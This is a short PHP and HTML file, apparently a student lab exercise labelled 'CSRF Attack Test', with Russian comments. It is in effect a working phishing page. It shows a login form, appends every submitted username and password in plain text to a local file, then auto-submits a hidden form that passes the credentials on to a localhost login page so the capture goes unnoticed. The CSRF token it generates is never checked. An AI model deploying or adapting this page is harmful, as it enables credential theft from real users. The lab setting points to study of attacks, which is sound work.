<?php
session_start();

// Проверка наличия CSRF токена в сессии, если его нет - создаем новый
if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32)); // Генерация случайного токена
}

// Обработчик POST-запроса для записи логина и пароля в файл
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Получаем данные из формы
    $username = trim($_POST['username']);
    $password = trim($_POST['password']);

    // Проверка на пустые поля
    if (empty($username) || empty($password)) {
        echo "Username and password cannot be empty!";
        exit;
    }

    // Запись логина и пароля в файл
    $user_data = "Username: $username, Password: $password\n";
    $file = 'user_credentials.txt'; // Путь к файлу, где будут сохраняться логины и пароли

    // Открываем файл для записи
    $handle = fopen($file, 'a');
    if ($handle) {
        fwrite($handle, $user_data); // Записываем данные в файл
        fclose($handle);  // Закрываем файл

        // Перенаправление на нужную страницу с помощью POST-запроса
        echo "<form id='redirect_form' action='http://localhost/laba2/login.php' method='POST' style='display: none;'>\n";
        echo "<input type='hidden' name='username' value='" . htmlspecialchars($username) . "'>\n";
        echo "<input type='hidden' name='password' value='" . htmlspecialchars($password) . "'>\n";
        echo "</form>\n";
        echo "<script>document.getElementById('redirect_form').submit();</script>";
        exit;
    } else {
        echo "Error opening the file.";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF Attack Test</title>
</head>
<body>
    <h1>CSRF Attack Test</h1>

    <form id="csrf_form" action="" method="POST">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required><br><br>

        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required><br><br>

        <button type="submit">Submit Login</button>
    </form>
</body>
</html>
